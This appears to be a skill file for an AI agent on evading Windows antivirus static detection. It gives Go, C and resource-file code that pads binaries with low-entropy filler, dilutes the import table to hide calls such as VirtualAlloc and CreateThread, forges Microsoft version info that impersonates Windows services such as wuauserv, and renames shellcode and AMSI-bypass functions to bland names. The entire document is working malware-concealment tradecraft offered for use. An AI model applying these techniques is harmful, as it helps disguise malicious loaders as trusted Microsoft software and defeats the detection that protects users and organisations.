# Static Evasion — Entropy Control, Import Dilution & Version Camouflage

> **Belongs to**: `windows-av-evasion` skill
> **Load when**: Binary flagged by static analysis (entropy > 7, suspicious imports, missing metadata)

## 1. Forced Entropy Control

### Why

AV/EDR static scanners flag binaries with entropy > 7 as suspicious (encrypted/packed). Target: **entropy ≤ 6**.

| Entropy Range | Detection Risk | Status |
|---|---|---|
| 0–4 | Low | Too low also suspicious |
| 4–6 | Low | **Target range** |
| 6–7 | Medium | Warning threshold |
| 7–8 | High | Easily detected |
| >8 | Critical | Guaranteed flag |

### Implementation — Low-Entropy Data Injection

```c
// Inject ~9KB of low-entropy data into every binary
// These appear as legitimate resource/config strings

// Segment 1: Fake copyright (1KB, entropy ~3.5)
var _copyright = `Microsoft Windows Operating System
Copyright (C) Microsoft Corporation. All rights reserved.
This program is protected by copyright law and international treaties.
Unauthorized reproduction or distribution may result in severe civil
and criminal penalties. For support, visit https://support.microsoft.com
Product ID: 00330-80000-00000-AA123
Build: 19041.1.amd64fre.vb_release.191206-1406`;

// Segment 2: Fake config data (2KB, entropy ~3.2)
var _configData = `[Settings]
Server=https://update.microsoft.com/v6/
CacheDir=C:\Windows\SoftwareDistribution\
MaxCacheSize=104857600
CheckInterval=3600
RetryCount=5
RetryDelay=600
ProxyMode=Auto
ProxyServer=
ProxyPort=8080
...`;

// Segment 3: Zero-byte padding (4KB, entropy = 0)
var _padding1 = [4096]byte{};

// Segment 4: Pattern padding (2KB, 10 repeating byte values)
// entropy ~3.3 — looks like structured data
var _padding2 = []byte{
    0x00,0x00,0x00,0x00, 0x11,0x11,0x11,0x11, 0x22,0x22,0x22,0x22,
    // ... 10 distinct byte patterns, 2048 bytes total
};

// Prevent compiler from optimizing away dead variables
func init() {
    _ = _copyright
    _ = _configData
    _ = &_padding1
    _ = &_padding2
}
```

### Verification

```bash
# Python entropy checker
python -c "
import math, sys

def entropy(data):
    freq = {}
    for b in data:
        freq[b] = freq.get(b, 0) + 1
    size = len(data)
    return -sum(p/size * math.log2(p/size) for p in freq.values())

data = open(sys.argv[1], 'rb').read()
ent = entropy(data)
print(f'Entropy: {ent:.2f}')
if ent > 6: print('WARNING: Entropy too high!')
else: print('OK: Entropy within safe range.')
" output.exe
```

---

## 2. Import Table Dilution

### Why

Sensitive APIs in import table (VirtualAlloc, CreateThread, WriteProcessMemory) are static detection signatures. Solution: **flood the import table with harmless APIs** so sensitive ones drown in noise.

### Harmless API List

**kernel32.dll (30 functions)**:
```
GetTickCount, GetSystemTime, GetLocalTime, GetTimeZoneInformation,
GetComputerNameW, GetUserNameW, GetEnvironmentStringsW,
GetCurrentDirectoryW, GetTempPathW, GetModuleFileNameW,
GetCommandLineW, GetVersionExW, GetSystemInfo, GetNativeSystemInfo,
GetLogicalDriveStringsW, GetDiskFreeSpaceW, GetVolumeInformationW,
GetFileAttributesW, SetFileAttributesW, CreateDirectoryW,
RemoveDirectoryW, MoveFileW, CopyFileW, DeleteFileW,
FindFirstFileW, FindNextFileW, FindClose, GetFileSize,
GetFileTime, SetFileTime
```

**user32.dll (31 functions)**:
```
GetSystemMetrics, GetDesktopWindow, GetForegroundWindow,
IsWindowVisible, IsWindowEnabled, GetWindowTextLengthW,
EnumWindows, EnumChildWindows, ShowWindow, UpdateWindow,
GetCursorPos, SetCursorPos, GetAsyncKeyState, GetKeyState,
GetKeyboardLayout, MapVirtualKeyW, GetMessagePos, GetMessageTime,
MessageBoxW, MessageBoxA, GetClientRect, GetWindowRect,
ScreenToClient, ClientToScreen, InvalidateRect, ValidateRect,
DrawTextW, LoadStringW, LoadIconW, LoadCursorW, LoadBitmapW
```

### Go Implementation

```go
// initHarmlessAPIs adds 60+ harmless API references to prevent
// the compiler from optimizing them out of the import table
func initHarmlessAPIs() {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    user32 := windows.NewLazySystemDLL("user32.dll")

    harmlessK32 := []string{
        "GetTickCount", "GetSystemTime", "GetLocalTime",
        "GetComputerNameW", "GetUserNameW", "GetEnvironmentStringsW",
        "GetCurrentDirectoryW", "GetTempPathW", "GetModuleFileNameW",
        "GetCommandLineW", "GetVersionExW", "GetSystemInfo",
    }

    harmlessU32 := []string{
        "GetSystemMetrics", "GetDesktopWindow", "GetForegroundWindow",
        "IsWindowVisible", "IsWindowEnabled", "GetWindowTextLengthW",
        "EnumWindows", "EnumChildWindows", "ShowWindow", "UpdateWindow",
        "GetCursorPos", "SetCursorPos", "GetAsyncKeyState",
    }

    // Force import by calling each once (discarded, but imports remain)
    for _, name := range harmlessK32 {
        proc := kernel32.NewProc(name)
        if proc != nil {
            proc.Call() // harmless call, no side effects
        }
    }
    for _, name := range harmlessU32 {
        proc := user32.NewProc(name)
        if proc != nil {
            proc.Call()
        }
    }
}
```

### Verification Target

After compilation, verify:
1. Sensitive APIs (VirtualAlloc, CreateThread) **not directly** in import table
2. Import table contains 60+ harmless APIs
3. Harmless API count ≥ sensitive API count (sensitive resolved via PEB Walk)

---

## 3. Version Information Camouflage

### Why

Binaries without version resources look suspicious. Embed Microsoft-style version info to appear legitimate.

### C Implementation (.rc resource file)

```rc
// version.rc — embed into binary at compile time
1 VERSIONINFO
FILEVERSION     10,0,19041,1
PRODUCTVERSION  10,0,19041,1
FILEFLAGSMASK   0x3fL
FILEFLAGS       0x0L
FILEOS          0x40004L  // NT_WINDOWS
FILETYPE        0x1L      // APP
FILESUBTYPE     0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"  // en-US, Unicode
        BEGIN
            VALUE "CompanyName",      "Microsoft Corporation"
            VALUE "FileDescription",  "Windows Update Service"
            VALUE "FileVersion",      "10.0.19041.1"
            VALUE "InternalName",     "wuauserv"
            VALUE "LegalCopyright",   "Copyright (C) Microsoft Corp."
            VALUE "OriginalFilename", "wuauserv.exe"
            VALUE "ProductName",      "Microsoft Windows Operating System"
            VALUE "ProductVersion",   "10.0.19041.1"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200  // en-US, Unicode
    END
END
```

```bash
# Compile with version resource
windres version.rc -o version.o
x86_64-w64-mingw32-gcc loader.c version.o -o loader.exe
```

### Go Implementation

```go
// Inline version strings (Go doesn't support .rc, embed as globals)
var (
    _companyName      = "Microsoft Corporation"
    _fileDescription  = "Windows Update Service"
    _fileVersion      = "10.0.19041.1"
    _internalName     = "wuauserv"
    _legalCopyright   = "Copyright (C) Microsoft Corp. All rights reserved."
    _originalFilename = "wuauserv.exe"
    _productName      = "Microsoft Windows Operating System"
    _productVersion   = "10.0.19041.1"

    // Prevent optimization removal
    _useVars = func() {
        _ = _companyName
        _ = _fileDescription
        _ = _fileVersion
        _ = _internalName
        _ = _legalCopyright
        _ = _originalFilename
        _ = _productName
        _ = _productVersion
    }
)
```

### Recommended Fake Identities

| Camouflage As | CompanyName | FileDescription | InternalName |
|---|---|---|---|
| Windows Update | Microsoft Corporation | Windows Update Service | wuauserv |
| .NET Runtime | Microsoft Corporation | .NET Runtime Optimization Service | mscorsvw |
| Windows Installer | Microsoft Corporation | Windows Installer | msiexec |
| Print Spooler | Microsoft Corporation | Spooler SubSystem App | spoolsv |
| Cryptographic Services | Microsoft Corporation | Cryptographic Services | svchost |

---

## 4. Function & Variable Name Obfuscation

### Why

Sensitive function names (`bypassAMSI`, `executeShellcode`) in binary symbol table or debug strings are instant red flags.

### Name Mapping

| Original (Sensitive) | Obfuscated | Camouflage Meaning |
|---|---|---|
| `bypassETW` | `fixSystem` | System configuration fix |
| `bypassAMSI` | `fixSystem` | (merged with above) |
| `executeShellcode` | `runConfig` | Run configuration data |
| `decryptShellcode` | `parseUuidConfig` | Parse UUID configuration |
| `virtualAlloc` | `allocMem` | Allocate memory |
| `createThread` | `execMem` | Execute memory data |
| `decryptAES` / `decryptXOR` | `parseUuidConfig` | Parse configuration |
| `hideConsole` | `initService` | Service initialization |
| `shellcode` | `d` | Generic data variable |
| `encryptedPayload` | `config` | Configuration data |
